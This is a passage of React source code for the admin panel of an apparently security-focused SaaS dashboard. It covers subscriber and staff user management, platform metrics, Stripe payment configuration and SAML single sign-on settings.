          {label:'Overdue',        val:overdueRevenue>0?`£${overdueRevenue}`:'£0', sub:overdueRevenue>0?'action needed':'all clear', color:overdueRevenue>0?'#f0405e':'#22d49a'},
        ].map(s=>(
          <div key={s.label} style={{padding:'14px 16px',background:'var(--wt-card)',border:`1px solid ${s.color}18`,borderRadius:12}}>
            <div style={{fontSize:'1.8rem',fontWeight:900,fontFamily:'JetBrains Mono,monospace',color:s.color,letterSpacing:-2,lineHeight:1}}>{s.val}</div>
            <div style={{fontSize:'0.58rem',fontWeight:700,color:s.color,textTransform:'uppercase',letterSpacing:'0.5px',marginTop:3}}>{s.sub}</div>
            <div style={{fontSize:'0.6rem',color:'var(--wt-dim)',marginTop:2}}>{s.label}</div>
          </div>
        ))}
      </div>

      {adminView==='subscribers' && (
        <div style={{background:'var(--wt-card)',border:'1px solid var(--wt-border)',borderRadius:12,padding:'16px 18px'}}>
          <div style={{display:'flex',alignItems:'center',gap:8,marginBottom:14,flexWrap:'wrap'}}>
            <span style={{fontSize:'0.72rem',fontWeight:700}}>All Subscribers</span>
            <div style={{display:'flex',gap:4,marginLeft:'auto',flexWrap:'wrap'}}>
              {['All','MSSP','Business','Team','Community'].map(p=>(
                <button key={p} onClick={()=>setFilterPlan(p)} style={{padding:'3px 9px',borderRadius:5,border:`1px solid ${filterPlan===p?planColor[p]||'#4f8fff':'var(--wt-border2)'}`,background:filterPlan===p?(planColor[p]||'#4f8fff')+'15':'transparent',color:filterPlan===p?planColor[p]||'#4f8fff':'var(--wt-muted)',fontSize:'0.6rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>{p}</button>
              ))}
              <span style={{width:1,background:'var(--wt-border)',margin:'0 2px'}}/>
              {['All','Active','Trial','Overdue','Churned'].map(s=>(
                <button key={s} onClick={()=>setFilterStatus(s)} style={{padding:'3px 9px',borderRadius:5,border:`1px solid ${filterStatus===s?statusColor[s]||'#4f8fff':'var(--wt-border2)'}`,background:filterStatus===s?(statusColor[s]||'#4f8fff')+'15':'transparent',color:filterStatus===s?statusColor[s]||'#4f8fff':'var(--wt-muted)',fontSize:'0.6rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>{s}</button>
              ))}
            </div>
          </div>
          <div style={{display:'grid',gridTemplateColumns:'1fr 90px 70px 60px 60px 140px',gap:8,padding:'6px 10px',fontSize:'0.56rem',fontWeight:700,color:'var(--wt-dim)',textTransform:'uppercase',letterSpacing:'0.5px',borderBottom:'1px solid var(--wt-border)',marginBottom:4}}>
            <span>Organisation</span><span style={{textAlign:'center'}}>Plan</span><span style={{textAlign:'center'}}>MRR</span><span style={{textAlign:'center'}}>Status</span><span style={{textAlign:'center'}}>Posture</span><span style={{textAlign:'right'}}>Actions</span>
          </div>
          {filtered.map(sub=>(
            <div key={sub.id} style={{display:'grid',gridTemplateColumns:'1fr 90px 70px 60px 60px 140px',gap:8,padding:'9px 10px',alignItems:'center',borderBottom:'1px solid var(--wt-border)',opacity:sub.status==='Churned'?0.4:1}}>
              <div>
                <div style={{display:'flex',alignItems:'center',gap:6}}>
                  <span style={{fontSize:'0.78rem',fontWeight:700}}>{sub.name}</span>
                  {sub.type==='MSSP' && <span style={{fontSize:'0.48rem',padding:'1px 5px',borderRadius:3,background:'#8b6fff15',color:'#8b6fff',fontWeight:700,border:'1px solid #8b6fff20'}}>MSSP · {sub.clients} clients</span>}
                </div>
                <div style={{fontSize:'0.6rem',color:'var(--wt-dim)',marginTop:1}}>Joined {sub.joined} · {sub.seats>0?sub.seats+' seats':'flat rate'}</div>
              </div>
              <div style={{textAlign:'center'}}><span style={{fontSize:'0.6rem',fontWeight:700,padding:'2px 7px',borderRadius:4,background:(planColor[sub.plan]||'#6b7a94')+'15',color:planColor[sub.plan]||'#6b7a94',border:`1px solid ${(planColor[sub.plan]||'#6b7a94')}20`}}>{sub.plan}</span></div>
              <div style={{textAlign:'center',fontSize:'0.74rem',fontWeight:700,fontFamily:'JetBrains Mono,monospace',color:sub.mrr>0?'var(--wt-text)':'var(--wt-dim)'}}>{sub.mrr>0?`£${sub.mrr}`:'—'}</div>
              <div style={{textAlign:'center'}}><span style={{fontSize:'0.56rem',fontWeight:700,padding:'2px 6px',borderRadius:3,background:(statusColor[sub.status]||'#6b7a94')+'15',color:statusColor[sub.status]||'#6b7a94'}}>{sub.status}</span></div>
              <div style={{textAlign:'center',fontSize:'0.74rem',fontWeight:700,fontFamily:'JetBrains Mono,monospace',color:sub.posture>=85?'#22d49a':sub.posture>=70?'#f0a030':sub.posture>0?'#f0405e':'var(--wt-dim)'}}>{sub.posture>0?sub.posture+'%':'—'}</div>
              <div style={{display:'flex',gap:4,justifyContent:'flex-end'}}>
                {sub.status!=='Churned' && <button onClick={()=>{setCurrentTenant(sub.id);setActiveTab('overview');}} style={{padding:'4px 8px',borderRadius:5,border:'1px solid #4f8fff30',background:'#4f8fff10',color:'#4f8fff',fontSize:'0.58rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>Impersonate →</button>}
                <button onClick={()=>setAdminBannerInput(`[${sub.name}] `)} style={{padding:'4px 7px',borderRadius:5,border:'1px solid var(--wt-border2)',background:'transparent',color:'var(--wt-muted)',fontSize:'0.58rem',cursor:'pointer',fontFamily:'Inter,sans-serif'}}>📢</button>
                {sub.billing==='Overdue' && <button style={{padding:'4px 7px',borderRadius:5,border:'1px solid #f97316',background:'#f9731610',color:'#f97316',fontSize:'0.58rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>£ Chase</button>}
              </div>
            </div>
          ))}
          <div style={{marginTop:12,padding:'10px 12px',background:'var(--wt-card2)',borderRadius:8,display:'flex',gap:16,flexWrap:'wrap'}}>
            {['MSSP','Business','Team'].map(p=>{
              const subs=WTC_SUBSCRIBERS.filter(s=>s.plan===p&&s.status!=='Churned');
              const mrr=subs.reduce((s,c)=>s+c.mrr,0);
              return mrr>0?(<div key={p} style={{display:'flex',alignItems:'center',gap:5}}><div style={{width:7,height:7,borderRadius:2,background:planColor[p],flexShrink:0}}/><span style={{fontSize:'0.66rem',color:'var(--wt-muted)'}}>{p}: <strong style={{color:planColor[p]}}>£{mrr}/mo</strong> · {subs.length} org{subs.length!==1?'s':''}</span></div>):null;
            })}
            <div style={{marginLeft:'auto',fontSize:'0.66rem',color:'var(--wt-muted)'}}>Total ARR: <strong style={{color:'#22d49a'}}>£{(totalMRR*12).toLocaleString()}</strong></div>
          </div>
        </div>
      )}

      {adminView==='users' && (
        <div style={{display:'flex',flexDirection:'column',gap:14}}>

          {/* Invite / Create user form */}
          <div style={{background:'var(--wt-card)',border:'1px solid #4f8fff20',borderRadius:12,padding:'18px 20px'}}>
            <div style={{fontSize:'0.78rem',fontWeight:700,marginBottom:4}}>Invite or Create Staff User</div>
            <div style={{fontSize:'0.7rem',color:'var(--wt-muted)',marginBottom:14}}>Internal team only — not customer accounts. Assign a role to control dashboard access.</div>
            <div style={{display:'grid',gridTemplateColumns:'1fr 1fr 160px 120px',gap:10,alignItems:'flex-end',flexWrap:'wrap'}}>
              <div>
                <label style={{display:'block',fontSize:'0.62rem',fontWeight:700,color:'var(--wt-muted)',textTransform:'uppercase',letterSpacing:'0.5px',marginBottom:5}}>Full Name</label>
                <input value={inviteForm.name} onChange={e=>setInviteForm(f=>({...f,name:e.target.value}))}
                  placeholder='Sarah Chen'
                  style={{width:'100%',padding:'8px 11px',background:'var(--wt-card2)',border:'1px solid var(--wt-border2)',borderRadius:7,color:'var(--wt-text)',fontSize:'0.8rem',fontFamily:'Inter,sans-serif',outline:'none',boxSizing:'border-box'}}/>
              </div>
              <div>
                <label style={{display:'block',fontSize:'0.62rem',fontWeight:700,color:'var(--wt-muted)',textTransform:'uppercase',letterSpacing:'0.5px',marginBottom:5}}>Email Address</label>
                <input value={inviteForm.email} onChange={e=>setInviteForm(f=>({...f,email:e.target.value}))}
                  placeholder='sarah@yourcompany.com' type='email'
                  style={{width:'100%',padding:'8px 11px',background:'var(--wt-card2)',border:'1px solid var(--wt-border2)',borderRadius:7,color:'var(--wt-text)',fontSize:'0.8rem',fontFamily:'Inter,sans-serif',outline:'none',boxSizing:'border-box'}}/>
              </div>
              <div>
                <label style={{display:'block',fontSize:'0.62rem',fontWeight:700,color:'var(--wt-muted)',textTransform:'uppercase',letterSpacing:'0.5px',marginBottom:5}}>Role</label>
                <select value={inviteForm.role} onChange={e=>setInviteForm(f=>({...f,role:e.target.value}))}
                  style={{width:'100%',padding:'8px 11px',background:'var(--wt-card2)',border:'1px solid var(--wt-border2)',borderRadius:7,color:'var(--wt-text)',fontSize:'0.78rem',fontFamily:'Inter,sans-serif',outline:'none',cursor:'pointer'}}>
                  <option value='tech_admin'>Tech Admin</option>
                  <option value='sales'>Sales</option>
                  <option value='viewer'>Viewer</option>
                </select>
              </div>
              <div>
                <button
                  onClick={()=>{
                    if (!inviteForm.email || !inviteForm.name) return;
                    setInviteStatus('sending');
                    // In production: POST /api/auth/invite
                    setTimeout(()=>{
                      setStaffUsers(prev=>[...prev, {
                        id:'u'+Date.now(), name:inviteForm.name, email:inviteForm.email,
                        role:inviteForm.role, status:'Pending', joined:new Date().toISOString().slice(0,10), lastSeen:'Never'
                      }]);
                      setInviteForm({name:'',email:'',role:'viewer'});
                      setInviteStatus('sent');
                      setTimeout(()=>setInviteStatus(null), 3000);
                    }, 800);
                  }}
                  disabled={inviteStatus==='sending'}
                  style={{width:'100%',padding:'9px 0',borderRadius:7,border:'none',background:'#4f8fff',color:'#fff',fontSize:'0.78rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif',opacity:inviteStatus==='sending'?0.7:1}}>
                  {inviteStatus==='sending'?'Sending…':inviteStatus==='sent'?'✓ Sent!':'Send Invite'}
                </button>
              </div>
            </div>
          </div>

          {/* Role capability guide */}
          <div style={{display:'grid',gridTemplateColumns:'repeat(3,1fr)',gap:8}}>
            {[
              {role:'Tech Admin', color:'#4f8fff', icon:'⚙️', caps:[
                'All customer account adds, moves, changes',
                'Connect / disconnect tool integrations',
                'Edit tenant settings and billing',
                'View all tabs including Admin',
                'Cannot invite other Admins',
              ]},
              {role:'Sales', color:'#22d49a', icon:'📈', caps:[
                'View-only access to security tabs',
                'Full Sales Dashboard access',
                'Set and track MRR/ARR targets',
                'View AI customer mix strategy',
                'Cannot modify customer settings',
              ]},
              {role:'Viewer', color:'#8b6fff', icon:'👁', caps:[
                'Overview, Alerts, Coverage, Vulns',
                'Intel and Incidents (read-only)',
                'No Tools, Admin, or Sales tabs',
                'Cannot modify any settings',
                'Cannot trigger actions',
              ]},
            ].map(r=>(
              <div key={r.role} style={{background:'var(--wt-card)',border:`1px solid ${r.color}20`,borderRadius:10,padding:'14px 16px'}}>
                <div style={{fontSize:'0.76rem',fontWeight:700,color:r.color,marginBottom:8}}>{r.icon} {r.role}</div>
                {r.caps.map(c=>(
                  <div key={c} style={{fontSize:'0.66rem',color:'var(--wt-secondary)',padding:'2px 0 2px 12px',position:'relative',lineHeight:1.4}}>
                    <span style={{position:'absolute',left:0,top:6,width:4,height:4,borderRadius:'50%',background:r.color,display:'block'}}/>
                    {c}
                  </div>
                ))}
              </div>
            ))}
          </div>

          {/* Staff user list */}
          <div style={{background:'var(--wt-card)',border:'1px solid var(--wt-border)',borderRadius:12,padding:'16px 18px'}}>
            <div style={{fontSize:'0.72rem',fontWeight:700,marginBottom:12}}>Team Members ({staffUsers.length})</div>
            {/* Column headers */}
            <div style={{display:'grid',gridTemplateColumns:'1fr 180px 100px 80px 100px',gap:8,padding:'5px 10px',fontSize:'0.56rem',fontWeight:700,color:'var(--wt-dim)',textTransform:'uppercase',letterSpacing:'0.5px',borderBottom:'1px solid var(--wt-border)',marginBottom:4}}>
              <span>User</span><span>Email</span><span>Role</span><span>Status</span><span style={{textAlign:'right'}}>Actions</span>
            </div>
            {staffUsers.map(user=>{
              const roleColor = {owner:'#f0a030',tech_admin:'#4f8fff',sales:'#22d49a',viewer:'#8b6fff'}[user.role]||'#6b7a94';
              const roleLabel = {owner:'Owner',tech_admin:'Tech Admin',sales:'Sales',viewer:'Viewer'}[user.role]||user.role;
              const isEditing = editingUser===user.id;
              return (
                <div key={user.id} style={{display:'grid',gridTemplateColumns:'1fr 180px 100px 80px 100px',gap:8,padding:'9px 10px',alignItems:'center',borderBottom:'1px solid var(--wt-border)',opacity:user.status==='Pending'?0.75:1}}>
                  <div>
                    <div style={{fontSize:'0.78rem',fontWeight:600}}>{user.name}</div>
                    <div style={{fontSize:'0.58rem',color:'var(--wt-dim)',marginTop:1}}>Last seen: {user.lastSeen}</div>
                  </div>
                  <div style={{fontSize:'0.66rem',color:'var(--wt-muted)',fontFamily:'JetBrains Mono,monospace',overflow:'hidden',textOverflow:'ellipsis',whiteSpace:'nowrap'}}>{user.email}</div>
                  <div>
                    {isEditing ? (
                      <select defaultValue={user.role}
                        onChange={e=>{
                          setStaffUsers(prev=>prev.map(u=>u.id===user.id?{...u,role:e.target.value}:u));
                          setEditingUser(null);
                        }}
                        style={{padding:'3px 6px',background:'var(--wt-card2)',border:'1px solid var(--wt-border2)',borderRadius:5,color:'var(--wt-text)',fontSize:'0.68rem',fontFamily:'Inter,sans-serif',outline:'none',cursor:'pointer'}}>
                        <option value='tech_admin'>Tech Admin</option>
                        <option value='sales'>Sales</option>
                        <option value='viewer'>Viewer</option>
                      </select>
                    ) : (
                      <span style={{fontSize:'0.62rem',fontWeight:700,padding:'2px 8px',borderRadius:4,background:roleColor+'15',color:roleColor,border:`1px solid ${roleColor}25`}}>{roleLabel}</span>
                    )}
                  </div>
                  <div>
                    <span style={{fontSize:'0.58rem',fontWeight:700,padding:'2px 6px',borderRadius:3,background:user.status==='Active'?'#22d49a12':'#f0a03012',color:user.status==='Active'?'#22d49a':'#f0a030'}}>{user.status}</span>
                  </div>
                  <div style={{display:'flex',gap:5,justifyContent:'flex-end'}}>
                    {user.role !== 'owner' && !isEditing && (
                      <button onClick={()=>setEditingUser(user.id)} style={{padding:'3px 8px',borderRadius:5,border:'1px solid var(--wt-border2)',background:'transparent',color:'var(--wt-muted)',fontSize:'0.6rem',cursor:'pointer',fontFamily:'Inter,sans-serif'}}>Edit</button>
                    )}
                    {isEditing && (
                      <button onClick={()=>setEditingUser(null)} style={{padding:'3px 8px',borderRadius:5,border:'1px solid var(--wt-border2)',background:'transparent',color:'var(--wt-muted)',fontSize:'0.6rem',cursor:'pointer',fontFamily:'Inter,sans-serif'}}>Cancel</button>
                    )}
                    {user.role !== 'owner' && (
                      <button onClick={()=>setStaffUsers(prev=>prev.filter(u=>u.id!==user.id))}
                        style={{padding:'3px 8px',borderRadius:5,border:'1px solid #f0405e25',background:'#f0405e08',color:'#f0405e',fontSize:'0.6rem',cursor:'pointer',fontFamily:'Inter,sans-serif'}}>Remove</button>
                    )}
                    {user.status==='Pending' && (
                      <button style={{padding:'3px 8px',borderRadius:5,border:'1px solid #4f8fff30',background:'#4f8fff10',color:'#4f8fff',fontSize:'0.6rem',cursor:'pointer',fontFamily:'Inter,sans-serif'}}>Resend</button>
                    )}
                  </div>
                </div>
              );
            })}
          </div>
        </div>
      )}

      {adminView==='platform' && (
        <div style={{display:'grid',gridTemplateColumns:'repeat(3,1fr)',gap:10}}>
          {[
            {label:'API Calls Today',val:'12,847',color:'#4f8fff',sub:'↑ 8% vs yesterday'},
            {label:'AI Tokens Used',val:'4.2M',color:'#8b6fff',sub:'across all tenants'},
            {label:'Redis Ops/min',val:'847',color:'#22d49a',sub:'avg latency 1.2ms'},
            {label:'Avg Uptime (30d)',val:'99.97%',color:'#22d49a',sub:'1 incident this month'},
            {label:'Active Sessions',val:'23',color:'#4f8fff',sub:'right now'},
            {label:'Sync Errors (24h)',val:'2',color:'#f0405e',sub:'Taegis · Splunk'},
            {label:'Alerts Triaged',val:'1,847',color:'#f0a030',sub:'across all orgs today'},
            {label:'New Signups (7d)',val:'3',color:'#22d49a',sub:'2 trial, 1 paid'},
            {label:'Churn (30d)',val:'1',color:'#f0405e',sub:'Logistics UK Ltd'},
          ].map(s=>(
            <div key={s.label} style={{padding:'14px 16px',background:'var(--wt-card)',border:`1px solid ${s.color}18`,borderRadius:12}}>
              <div style={{fontSize:'1.6rem',fontWeight:900,fontFamily:'JetBrains Mono,monospace',color:s.color,letterSpacing:-2,lineHeight:1}}>{s.val}</div>
              <div style={{fontSize:'0.6rem',color:'var(--wt-dim)',marginTop:4}}>{s.label}</div>
              <div style={{fontSize:'0.58rem',color:s.color,marginTop:2,opacity:0.8}}>{s.sub}</div>
            </div>
          ))}
        </div>
      )}

      {adminView==='stripe' && (
        <div style={{display:'flex',flexDirection:'column',gap:14}}>
          <div style={{padding:'16px 18px',background:'var(--wt-card)',border:'1px solid #8b6fff20',borderRadius:12}}>
            <div style={{fontSize:'0.78rem',fontWeight:700,marginBottom:4,display:'flex',alignItems:'center',gap:8}}>
              💳 Stripe Configuration
              {stripeConfig.publishableKey && stripeConfig.publishableKey !== '••••••••' && <span style={{fontSize:'0.58rem',color:'#22d49a',background:'#22d49a12',padding:'2px 7px',borderRadius:4,border:'1px solid #22d49a25'}}>✓ Configured</span>}
            </div>
            <div style={{fontSize:'0.7rem',color:'var(--wt-muted)',marginBottom:18,lineHeight:1.6}}>
              Connect your Stripe account to enable subscription payments. Keys are encrypted at rest.
              <a href='https://dashboard.stripe.com/apikeys' target='_blank' rel='noopener' style={{color:'#4f8fff',marginLeft:6}}>Get your keys →</a>
            </div>
            <div style={{display:'grid',gridTemplateColumns:'1fr 1fr',gap:12}}>
              {[
                {key:'publishableKey', label:'Publishable Key', placeholder:'pk_live_...', hint:'Safe to use in browser'},
                {key:'secretKey', label:'Secret Key', placeholder:'sk_live_...', hint:'Never share — server only', secret:true},
                {key:'webhookSecret', label:'Webhook Secret', placeholder:'whsec_...', hint:'From Stripe webhook settings', secret:true},
                {key:'priceMssp', label:'MSSP Price ID', placeholder:'price_...', hint:'Monthly MSSP plan price ID'},
                {key:'priceBusiness', label:'Business Price ID', placeholder:'price_...', hint:'Monthly Business plan price ID'},
                {key:'priceTeamPerSeat', label:'Team Per-Seat Price ID', placeholder:'price_...', hint:'Per-seat Team plan price ID'},
              ].map(field=>(
                <div key={field.key}>
                  <label style={{display:'block',fontSize:'0.62rem',fontWeight:700,color:'var(--wt-muted)',textTransform:'uppercase',letterSpacing:'0.5px',marginBottom:5}}>{field.label}</label>
                  <input
                    type={field.secret ? 'password' : 'text'}
                    value={stripeConfig[field.key] || ''}
                    onChange={e=>setStripeConfig(prev=>({...prev,[field.key]:e.target.value}))}
                    placeholder={field.placeholder}
                    style={{width:'100%',padding:'8px 11px',background:'var(--wt-card2)',border:'1px solid var(--wt-border2)',borderRadius:7,color:'var(--wt-text)',fontSize:'0.78rem',fontFamily:'JetBrains Mono,monospace',outline:'none',boxSizing:'border-box'}}
                  />
                  <div style={{fontSize:'0.6rem',color:'var(--wt-dim)',marginTop:3}}>{field.hint}</div>
                </div>
              ))}
            </div>
            <div style={{marginTop:16,display:'flex',gap:10,alignItems:'center'}}>
              <button
                onClick={async()=>{
                  setStripeSaving(true); setStripeSaved(false);
                  try {
                    const res = await fetch('/api/admin/stripe-config',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(stripeConfig)});
                    const d = await res.json();
                    if (d.ok) { setStripeSaved(true); setTimeout(()=>setStripeSaved(false),3000); }
                  } catch(e) {}
                  setStripeSaving(false);
                }}
                disabled={stripeSaving}
                style={{padding:'9px 22px',borderRadius:8,border:'none',background:'#8b6fff',color:'#fff',fontSize:'0.78rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif',opacity:stripeSaving?0.7:1}}>
                {stripeSaving?'Saving…':'Save Stripe Config'}
              </button>
              {stripeSaved && <span style={{fontSize:'0.72rem',color:'#22d49a',fontWeight:600}}>✓ Saved and encrypted</span>}
            </div>
          </div>

          <div style={{padding:'14px 18px',background:'var(--wt-card)',border:'1px solid var(--wt-border)',borderRadius:12}}>
            <div style={{fontSize:'0.72rem',fontWeight:700,marginBottom:10}}>Webhook endpoint to configure in Stripe</div>
            <div style={{padding:'10px 12px',background:'var(--wt-card2)',borderRadius:7,fontFamily:'JetBrains Mono,monospace',fontSize:'0.72rem',color:'#4f8fff',display:'flex',justifyContent:'space-between',alignItems:'center'}}>
              <span>https://getwatchtower.io/api/stripe/webhook</span>
              <button onClick={()=>navigator.clipboard.writeText('https://getwatchtower.io/api/stripe/webhook')} style={{padding:'3px 8px',borderRadius:5,border:'1px solid #4f8fff30',background:'#4f8fff10',color:'#4f8fff',fontSize:'0.6rem',cursor:'pointer',fontFamily:'Inter,sans-serif'}}>Copy</button>
            </div>
            <div style={{fontSize:'0.66rem',color:'var(--wt-muted)',marginTop:8,lineHeight:1.6}}>
              Events to enable: <strong style={{color:'var(--wt-text)'}}>checkout.session.completed, customer.subscription.updated, customer.subscription.deleted, invoice.payment_failed</strong>
            </div>
          </div>

          <div style={{display:'grid',gridTemplateColumns:'repeat(3,1fr)',gap:8}}>
            {[
              {plan:'MSSP', price:'£799+/mo', id:stripeConfig.priceMssp, color:'#8b6fff'},
              {plan:'Business', price:'£199/mo', id:stripeConfig.priceBusiness, color:'#22d49a'},
              {plan:'Team', price:'£49/seat', id:stripeConfig.priceTeamPerSeat, color:'#4f8fff'},
            ].map(p=>(
              <div key={p.plan} style={{padding:'12px 14px',background:'var(--wt-card)',border:`1px solid ${p.color}20`,borderRadius:10}}>
                <div style={{fontSize:'0.7rem',fontWeight:700,color:p.color,marginBottom:2}}>{p.plan}</div>
                <div style={{fontSize:'0.84rem',fontWeight:800,fontFamily:'JetBrains Mono,monospace',marginBottom:6}}>{p.price}</div>
                <div style={{fontSize:'0.6rem',color:p.id&&p.id!=='••••••••'?'#22d49a':'#f0405e',fontWeight:600}}>{p.id&&p.id!=='••••••••'?'✓ Price ID set':'⚠ Price ID missing'}</div>
              </div>
            ))}
          </div>
        </div>
      )}

      {adminView==='saml' && (
        <div style={{display:'flex',flexDirection:'column',gap:14}}>
          <div style={{padding:'16px 18px',background:'var(--wt-card)',border:'1px solid #4f8fff20',borderRadius:12}}>
            <div style={{fontSize:'0.78rem',fontWeight:700,marginBottom:4,display:'flex',alignItems:'center',gap:10}}>
              🔐 SAML SSO Configuration
              <label style={{display:'flex',alignItems:'center',gap:6,cursor:'pointer',fontSize:'0.72rem',fontWeight:600,color:samlConfig.enabled?'#22d49a':'#6b7a94'}}>
                <input type='checkbox' checked={samlConfig.enabled} onChange={e=>setSamlConfig(prev=>({...prev,enabled:e.target.checked}))}
                  style={{cursor:'pointer'}}/>
                {samlConfig.enabled?'Enabled':'Disabled'}
              </label>
            </div>
            <div style={{fontSize:'0.7rem',color:'var(--wt-muted)',marginBottom:18,lineHeight:1.6}}>
              Allow staff to sign in via your company's Identity Provider (Okta, Azure AD, Google Workspace, etc.) using SAML 2.0.
              Users without accounts are auto-provisioned with the default role.
            </div>

            <div style={{display:'grid',gridTemplateColumns:'1fr 1fr',gap:12,marginBottom:12}}>
              {[
                {key:'idpEntityId', label:'IdP Entity ID', placeholder:'https://your-idp.okta.com/...'},
                {key:'idpSsoUrl', label:'IdP SSO URL (POST binding)', placeholder:'https://your-idp.okta.com/app/.../sso/saml'},
                {key:'spEntityId', label:'SP Entity ID (your domain)', placeholder:'https://getwatchtower.io'},
                {key:'defaultRole', label:'Default role for new SAML users', type:'select'},
                {key:'domains', label:'Allowed email domains (comma-separated)', placeholder:'yourcompany.com, subsidiary.com'},
              ].map(field=>(
                <div key={field.key} style={{gridColumn:field.key==='idpCert'?'1 / -1':undefined}}>
                  <label style={{display:'block',fontSize:'0.62rem',fontWeight:700,color:'var(--wt-muted)',textTransform:'uppercase',letterSpacing:'0.5px',marginBottom:5}}>{field.label}</label>
                  {field.type==='select'?(
                    <select value={samlConfig.defaultRole} onChange={e=>setSamlConfig(prev=>({...prev,defaultRole:e.target.value}))}
                      style={{width:'100%',padding:'8px 11px',background:'var(--wt-card2)',border:'1px solid var(--wt-border2)',borderRadius:7,color:'var(--wt-text)',fontSize:'0.78rem',fontFamily:'Inter,sans-serif',outline:'none',cursor:'pointer'}}>
                      <option value='tech_admin'>Tech Admin</option>
                      <option value='sales'>Sales</option>
                      <option value='viewer'>Viewer</option>
                    </select>
                  ):(
                    <input value={samlConfig[field.key]||''} onChange={e=>setSamlConfig(prev=>({...prev,[field.key]:e.target.value}))}
                      placeholder={field.placeholder||''}
                      style={{width:'100%',padding:'8px 11px',background:'var(--wt-card2)',border:'1px solid var(--wt-border2)',borderRadius:7,color:'var(--wt-text)',fontSize:'0.78rem',fontFamily:'JetBrains Mono,monospace',outline:'none',boxSizing:'border-box'}}/>
                  )}
                </div>
              ))}
            </div>

            <div style={{marginBottom:12}}>
              <label style={{display:'block',fontSize:'0.62rem',fontWeight:700,color:'var(--wt-muted)',textTransform:'uppercase',letterSpacing:'0.5px',marginBottom:5}}>IdP Certificate (X.509 PEM)</label>
              <textarea value={samlConfig.idpCert||''} onChange={e=>setSamlConfig(prev=>({...prev,idpCert:e.target.value}))}
                rows={4} placeholder={'-----BEGIN CERTIFICATE-----
MIIC...
-----END CERTIFICATE-----'}
                style={{width:'100%',padding:'8px 11px',background:'var(--wt-card2)',border:'1px solid var(--wt-border2)',borderRadius:7,color:'var(--wt-text)',fontSize:'0.72rem',fontFamily:'JetBrains Mono,monospace',outline:'none',resize:'vertical',boxSizing:'border-box'}}/>
            </div>

            <div style={{marginBottom:16,padding:'12px 14px',background:'var(--wt-card2)',borderRadius:8,border:'1px solid var(--wt-border)'}}>
              <div style={{fontSize:'0.7rem',fontWeight:700,marginBottom:6}}>Attribute Mapping</div>
              <div style={{display:'grid',gridTemplateColumns:'repeat(3,1fr)',gap:8}}>
                {[['email','Email attribute','email'],['name','Name attribute','displayName'],['role','Role attribute (optional)','role']].map(([key,lbl,ph])=>(
                  <div key={key}>
                    <label style={{display:'block',fontSize:'0.6rem',fontWeight:600,color:'var(--wt-dim)',marginBottom:3}}>{lbl}</label>
                    <input value={(samlConfig.attributeMapping||{})[key]||''} onChange={e=>setSamlConfig(prev=>({...prev,attributeMapping:{...prev.attributeMapping,[key]:e.target.value}}))}
                      placeholder={ph}
                      style={{width:'100%',padding:'5px 8px',background:'var(--wt-card)',border:'1px solid var(--wt-border)',borderRadius:5,color:'var(--wt-text)',fontSize:'0.72rem',fontFamily:'JetBrains Mono,monospace',outline:'none',boxSizing:'border-box'}}/>
                  </div>
                ))}
              </div>
            </div>

            <div style={{display:'flex',gap:10,alignItems:'center',flexWrap:'wrap'}}>
              <button onClick={async()=>{
                setSamlSaving(true);setSamlSaved(false);
                const payload={...samlConfig,domains:samlConfig.domains?samlConfig.domains.split(',').map(d=>d.trim()).filter(Boolean):[]};
                try{const r=await fetch('/api/admin/saml-config',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});
                const d=await r.json();if(d.ok){setSamlSaved(true);setTimeout(()=>setSamlSaved(false),3000);}}catch(e){}
                setSamlSaving(false);
              }} disabled={samlSaving} style={{padding:'9px 22px',borderRadius:8,border:'none',background:'#4f8fff',color:'#fff',fontSize:'0.78rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif',opacity:samlSaving?0.7:1}}>
                {samlSaving?'Saving…':'Save SAML Config'}
              </button>
              {samlSaved&&<span style={{fontSize:'0.72rem',color:'#22d49a',fontWeight:600}}>✓ Saved</span>}
            </div>
          </div>

          <div style={{padding:'14px 18px',background:'var(--wt-card)',border:'1px solid var(--wt-border)',borderRadius:12}}>
            <div style={{fontSize:'0.72rem',fontWeight:700,marginBottom:10}}>SP Metadata & Configuration</div>
            <div style={{display:'flex',flexDirection:'column',gap:8}}>
              {[
                {label:'SP Metadata URL', val:'https://getwatchtower.io/api/auth/saml/metadata'},
                {label:'ACS URL (AssertionConsumerService)', val:'https://getwatchtower.io/api/auth/saml/callback'},
                {label:'SP Entity ID', val:'https://getwatchtower.io'},
                {label:'SSO Login URL', val:`https://getwatchtower.io/api/auth/saml?tenant=${currentTenant}`},
              ].map(item=>(
                <div key={item.label} style={{display:'flex',alignItems:'center',gap:10,padding:'8px 10px',background:'var(--wt-card2)',borderRadius:7}}>
                  <span style={{fontSize:'0.62rem',color:'var(--wt-muted)',minWidth:200,fontWeight:600}}>{item.label}</span>
                  <span style={{flex:1,fontFamily:'JetBrains Mono,monospace',fontSize:'0.66rem',color:'#4f8fff'}}>{item.val}</span>
                  <button onClick={()=>navigator.clipboard.writeText(item.val)} style={{padding:'3px 8px',borderRadius:5,border:'1px solid #4f8fff30',background:'#4f8fff10',color:'#4f8fff',fontSize:'0.6rem',cursor:'pointer',fontFamily:'Inter,sans-serif',flexShrink:0}}>Copy</button>
                </div>
              ))}
            </div>
            <div style={{marginTop:10,fontSize:'0.68rem',color:'var(--wt-muted)',lineHeight:1.7}}>
              Supported IdPs: <strong style={{color:'var(--wt-text)'}}>Okta · Azure AD / Entra ID · Google Workspace · OneLogin · Ping Identity · JumpCloud · Any SAML 2.0 IdP</strong>
            </div>
          </div>
        </div>
      )}

      {adminView==='broadcast' && (
        <div style={{display:'flex',flexDirection:'column',gap:12}}>
          <div style={{background:'var(--wt-card)',border:'1px solid var(--wt-border)',borderRadius:12,padding:'16px 18px'}}>
            <div style={{fontSize:'0.78rem',fontWeight:700,marginBottom:4}}>📢 Broadcast to All Subscribers</div>
            <div style={{fontSize:'0.7rem',color:'var(--wt-muted)',marginBottom:12,lineHeight:1.6}}>Send a dismissable banner to every logged-in user across all tenants.</div>
